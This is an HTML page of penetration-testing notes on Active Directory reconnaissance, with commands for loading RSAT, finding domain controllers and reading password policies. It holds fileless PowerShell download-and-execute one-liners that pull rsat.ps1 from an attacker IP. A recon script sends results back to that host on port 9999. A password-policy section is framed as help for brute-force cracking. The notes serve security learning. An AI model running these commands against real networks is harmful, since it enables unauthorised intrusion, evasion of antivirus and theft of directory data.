<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="gandhi-taha">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Reconnaissance - Notes</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Using Active Directory Remote Server Administration Toolkit (RSAT)", url: "#_top", children: [
          ]},
          {title: "Check to which domain the computer is connected", url: "#check-to-which-domain-the-computer-is-connected", children: [
              {title: "Get all Organizational Units (OUs)", url: "#get-all-organizational-units-ous" },
          ]},
          {title: "Find domain-controllers", url: "#find-domain-controllers", children: [
              {title: "Method 1", url: "#method-1" },
              {title: "Method 2", url: "#method-2" },
              {title: "Method 3", url: "#method-3" },
          ]},
          {title: "Find Password Complexity Requirements", url: "#find-password-complexity-requirements", children: [
              {title: "GPO", url: "#gpo" },
              {title: "Fine grained password policies (FGPP)", url: "#fine-grained-password-policies-fgpp" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../initial_access/llmnr_and_nbtns_poisoning/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../initial_access/llmnr_and_nbtns_poisoning/" class="btn btn-xs btn-link">
        LLMNR and NBT-NS Poisoning
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../understanding_active_directory/default_groups/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../understanding_active_directory/default_groups/" class="btn btn-xs btn-link">
        Default Groups
      </a>
    </div>
    
  </div>

    

    <h2 id="using-active-directory-remote-server-administration-toolkit-rsat">Using Active Directory Remote Server Administration Toolkit (RSAT)<a class="headerlink" href="#using-active-directory-remote-server-administration-toolkit-rsat" title="Permanent link">#</a></h2>
<p>Most client computers and even servers don't have RSAT installed.<br />
You usually need to be local admin to install RSAT.</p>
<p>However, every DC comes with RSAT installed, and it is just a dll found here on the DC: <code>C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management\XXX\Microsoft.ActiveDirectory.Management.dll</code></p>
<p>If you want you can just upload that dll to your computer, import it and then you have access to the RSAT commands.</p>
<pre><code>import-module Microsoft.ActiveDirectory.Management.dll
get-addomain
</code></pre>

<pre><code>sha256sum Microsoft.ActiveDirectory.Management.dll
8eb311a48c6bb32577dac1844372513fbc66e0093351206fb17679ebd1272135  Microsoft.ActiveDirectory.Management.dll
</code></pre>

<p>If you don't want to write anything to disk you can import the entire module straight into memory with the script found <a href="../../tools-and-scripts/rsat.ps1">here</a>. The script uses <code>[System.Reflection.Assembly]::Load($bytes)</code> which sometimes triggers WinDefender to check the files. </p>
<pre><code>iex (New-Object Net.WebClient).DownloadString(&quot;http://192.168.77.90/rsat.ps1&quot;)
get-aduser -filter *
</code></pre>

<p>The RSAT module can be loaded and an additional recon-script can be executed, that send home the result of the recon, all can be done without touching disk.
There are two ways to execute both, or several, command in oneline:</p>
<pre><code class="ps1">'(New-Object Net.WebClient).DownloadString(&quot;http://192.168.77.90/rsat.ps1&quot;)', 'get-recon -ip 192.168.77.90 -port 9999' | invoke-expression
</code></pre>

<pre><code class="ps1">invoke-command -scriptblock {(New-Object Net.WebClient).DownloadString(&quot;http://192.168.77.90/rsat.ps1&quot;); get-recon -ip 192.168.77.90 -port 9999} 
</code></pre>

<h2 id="check-to-which-domain-the-computer-is-connected">Check to which domain the computer is connected<a class="headerlink" href="#check-to-which-domain-the-computer-is-connected" title="Permanent link">#</a></h2>
<pre><code>systeminfo
</code></pre>

<h3 id="get-all-organizational-units-ous">Get all Organizational Units (OUs)<a class="headerlink" href="#get-all-organizational-units-ous" title="Permanent link">#</a></h3>
<pre><code>ldapsearch -h evilcorp.local  -w SecretPassword  -b &quot;dc=evilcorp,dc=local&quot; -D &quot;cn=Philip L,cn=users,dc=evilcorp,dc=local&quot; &quot;(objectClass=organizationalUnit)&quot;
</code></pre>

<h2 id="find-domain-controllers">Find domain-controllers<a class="headerlink" href="#find-domain-controllers" title="Permanent link">#</a></h2>
<h4 id="method-1">Method 1<a class="headerlink" href="#method-1" title="Permanent link">#</a></h4>
<p>Open cmd.exe and run:</p>
<pre><code>set logonserver
</code></pre>

<p>Check for "Logon server"</p>
<pre><code>systeminfo
</code></pre>

<h4 id="method-2">Method 2<a class="headerlink" href="#method-2" title="Permanent link">#</a></h4>
<p>Open cmd.exe and run: </p>
<pre><code>echo %logonserver%
</code></pre>

<h4 id="method-3">Method 3<a class="headerlink" href="#method-3" title="Permanent link">#</a></h4>
<p>To find all DC in a domain open CMD/PowerShell and run:</p>
<pre><code>nltest.exe /dclist:&lt;domain&gt;
</code></pre>

<h2 id="find-password-complexity-requirements">Find Password Complexity Requirements<a class="headerlink" href="#find-password-complexity-requirements" title="Permanent link">#</a></h2>
<p>Knowledge of the password complexity requirements is useful if you want to perform brute force password cracking attacks, or create password lists that comply with the domains password complexity requirements.</p>
<h3 id="gpo">GPO<a class="headerlink" href="#gpo" title="Permanent link">#</a></h3>
<p>What complicates things even more is that Password Policy can also be set in GPO, but NOT through GPOs that are linked to a OU. THe Password Policy GPO must be linked to the domain in order to take effect.
And you can also set multiple password policies to one user/group, but with different precedence.</p>
<p>All and all, it is hard to know which password policy a specific user must adhere to.</p>
<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770394(v=ws.10)?redirectedfrom=MSDN</p>
<h3 id="fine-grained-password-policies-fgpp">Fine grained password policies (FGPP)<a class="headerlink" href="#fine-grained-password-policies-fgpp" title="Permanent link">#</a></h3>
<p>Since 2008 it has been possible to create find-grained password requirements, for a specific user or for a group.</p>
<p>If you go to <code>ADUC / System / Password Settings Policy</code> you can create a password policy. This policy can then be assigned to either users or groups. This means that a group or user can have different password policies.</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../initial_access/llmnr_and_nbtns_poisoning/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../initial_access/llmnr_and_nbtns_poisoning/" class="btn btn-xs btn-link">
        LLMNR and NBT-NS Poisoning
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../understanding_active_directory/default_groups/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../understanding_active_directory/default_groups/" class="btn btn-xs btn-link">
        Default Groups
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
      <p>
        <a href="https://github.com/gandhi-taha/edit/master/docs/attacking_active_directory_domain/recon/active_directory_recon.md"><i class="fa fa-github"></i>
Edit on GitHub</a>
      </p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>